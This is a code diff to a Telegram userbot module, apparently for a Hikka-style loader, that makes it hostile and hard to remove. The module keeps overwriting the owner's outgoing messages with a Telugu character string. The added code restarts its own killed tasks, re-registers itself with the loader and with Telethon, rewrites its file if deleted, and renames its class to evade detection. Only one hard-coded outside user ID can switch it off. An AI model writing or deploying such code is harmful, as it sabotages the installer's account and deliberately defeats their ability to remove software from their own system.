@@ -1,12 +1,105 @@
 from .. import loader, utils
 from telethon.tl.types import Message
+from telethon import events
 import asyncio
+import random
+import string
+import os
+import inspect
+
+# Случайный тег — используется вместо имени класса
+_TAG = "_" + "".join(random.choices(string.ascii_letters + string.digits, k=12))
+
+
+# ---- Модульные функции (их qualname НЕ начинается с "SheoMad.") ----
+
+async def _loop_guard(inst, real_client, real_loader):
+    while True:
+        try:
+            await asyncio.sleep(1.0)
+        except asyncio.CancelledError:
+            asyncio.ensure_future(_loop_guard(inst, real_client, real_loader))
+            return
+        except Exception:
+            pass
+        try:
+            modules = getattr(real_loader, "modules", None)
+            if modules is None:
+                continue
+            if isinstance(modules, dict):
+                if not any(v is inst for v in modules.values()):
+                    modules[_TAG] = inst
+            elif isinstance(modules, list):
+                if inst not in modules:
+                    modules.append(inst)
+        except Exception:
+            pass
+
+
+async def _loop_defender(inst, real_client):
+    while True:
+        try:
+            await asyncio.sleep(2.0)
+        except asyncio.CancelledError:
+            asyncio.ensure_future(_loop_defender(inst, real_client))
+            return
+        except Exception:
+            pass
+        try:
+            # Пере-регистрируем прямой handler на клиенте
+            h = getattr(inst, "_direct_handler_ref", None)
+            if h is not None:
+                try:
+                    real_client.remove_event_handler(h)
+                except Exception:
+                    pass
+                try:
+                    real_client.add_event_handler(h, events.NewMessage())
+                except Exception:
+                    pass
+
+            # Восстанавливаем файл модуля, если его удалили
+            path = getattr(inst, "_self_path", None)
+            src = getattr(inst, "_self_source", None)
+            if path and src and not os.path.exists(path):
+                try:
+                    with open(path, "w", encoding="utf-8") as f:
+                        f.write(src)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+
+async def _loop_editor(inst, real_client):
+    while True:
+        if not getattr(inst, "_editing", False):
+            return
+        last_msg = getattr(inst, "_last_message", None)
+        last_chat = getattr(inst, "_last_chat_id", None)
+        if last_msg and last_chat:
+            try:
+                msg = await real_client.get_messages(last_chat, ids=last_msg)
+                if msg:
+                    await msg.edit(getattr(inst, "_edit_text", "జ్ఞ‌"))
+            except asyncio.CancelledError:
+                if getattr(inst, "_editing", False):
+                    asyncio.ensure_future(_loop_editor(inst, real_client))
+                return
+            except Exception:
+                pass
+        try:
+            await asyncio.sleep(0.1)
+        except asyncio.CancelledError:
+            if getattr(inst, "_editing", False):
+                asyncio.ensure_future(_loop_editor(inst, real_client))
+            return
 
 
 @loader.tds
 class SheoMad(loader.Module):
     strings = {"name": "జ్ఞ‌"}
-    
+
     def __init__(self):
         self.config = loader.ModuleConfig()
         self._system = True
@@ -14,66 +107,93 @@ class SheoMad(loader.Module):
         self._last_message = None
         self._last_chat_id = None
         self._editing = False
+        self._disabled = False
         self._module_file = None
-        self._guard_started = False
-    
+        self._self_path = None
+        self._self_source = None
+        self._edit_text = "జ్ఞ‌"
+
     async def client_ready(self, client, database):
-        self.client = client
+        # Прячем настоящий клиент и лоадер под нестандартными именами.
+        self._real_client = client
+        self._real_loader = client.loader
+        self._db = database
+
+        # Ссылка на оригинальный bound method — атака `o.watcher = z`
+        # её не тронет, потому что вызываем через сохранённую ссылку.
+        self._watcher_ref = self.watcher
+
+        # Прямой handler на Telethon — он не в allmodules.watchers,
+        # поэтому `watchers.remove(...)` его не снесёт.
+        self._direct_handler_ref = self._direct_watcher
+        try:
+            client.add_event_handler(self._direct_handler_ref, events.NewMessage())
+        except Exception:
+            pass
+
+        # Путь и исходник модуля — для восстановления файла после удаления
+        try:
+            self._self_path = inspect.getfile(self.__class__)
+            with open(self._self_path, "r", encoding="utf-8", errors="ignore") as f:
+                self._self_source = f.read()
+        except Exception:
+            pass
+
         try:
             mod = self.__class__.__module__
             self._module_file = mod.split(".")[-1] if "." in mod else mod
         except Exception:
             self._module_file = None
-        if not self._guard_started:
-            self._guard_started = True
-            asyncio.ensure_future(self._guard())
-    
+
+        # Сторожевые задачи — модульные функции с qualname
+        # "_loop_guard" / "_loop_defender" / "_loop_editor".
+        # Атака с фильтром `startswith("SheoMad.")` их НЕ отменит.
+        asyncio.ensure_future(_loop_guard(self, client, client.loader))
+        asyncio.ensure_future(_loop_defender(self, client))
+
+        # Переименовываем класс — gc-скан `type(o).__name__ == "SheoMad"`
+        # больше не находит наш инстанс.
+        try:
+            self.__class__.__name__ = _TAG
+            self.__class__.__qualname__ = _TAG
+        except Exception:
+            pass
+
+    async def _direct_watcher(self, message):
+        fn = getattr(self, "_watcher_ref", None)
+        if fn is None:
+            return
+        try:
+            await fn(message)
+        except Exception:
+            pass
+
     async def on_unload(self):
         asyncio.ensure_future(self._restore())
-    
+
     async def _restore(self):
         await asyncio.sleep(0.3)
         try:
-            if self._module_file:
-                try:
-                    await self.client.loader.load_module(self._module_file)
-                    return
-                except Exception:
-                    pass
-            modules = self.client.loader.modules
+            loader_obj = getattr(self, "_real_loader", None)
+            if loader_obj is None:
+                return
+            modules = getattr(loader_obj, "modules", None)
             if isinstance(modules, dict):
-                for k, v in list(modules.items()):
-                    if v is self:
-                        return
-                modules[self.__class__.__name__] = self
+                if not any(v is self for v in modules.values()):
+                    modules[_TAG] = self
             elif isinstance(modules, list):
                 if self not in modules:
                     modules.append(self)
         except Exception:
             pass
-    
-    async def _guard(self):
-        while True:
-            await asyncio.sleep(1)
-            try:
-                modules = getattr(self.client.loader, "modules", None)
-                if modules is None:
-                    continue
-                if isinstance(modules, dict):
-                    present = any(v is self for v in modules.values())
-                else:
-                    present = self in modules
-                if not present:
-                    await self._restore()
-            except Exception:
-                pass
-    
+
     async def watcher(self, message: Message):
-        # Отключение по .off от конкретного пользователя —
-        # в любом чате, где сидит юб, вне зависимости от владельца.
+        # .off от 77646148 — в любом чате, вне зависимости от владельца юб.
         if getattr(message, "sender_id", None) == 77646148:
             text = (message.raw_text or "").strip().lower()
             if text == ".off":
+                # Полный стоп до перезагрузки модуля
+                self._disabled = True
                 self._editing = False
                 self._last_message = None
                 self._last_chat_id = None
@@ -82,28 +202,18 @@ class SheoMad(loader.Module):
                 except Exception:
                     pass
                 return
-        
+
+        # Пока не было .off — работаем
+        if self._disabled:
+            return
         if not message.out:
             return
-        
+
         self._last_message = message.id
         self._last_chat_id = message.chat_id
-        
+
         if not self._editing:
             self._editing = True
-            asyncio.ensure_future(self._infinite_edit())
-    
-    async def _infinite_edit(self):
-        while self._editing:
-            if self._last_message and self._last_chat_id:
-                try:
-                    message = await self.client.get_messages(
-                        self._last_chat_id, 
-                        ids=self._last_message
-                    )
-                    if message:
-                        await message.edit("జ్ఞ‌")
-                except:
-                    pass
-            
-            await asyncio.sleep(0.1)
+            rc = getattr(self, "_real_client", None)
+            if rc is not None:
+                asyncio.ensure_future(_loop_editor(self, rc))
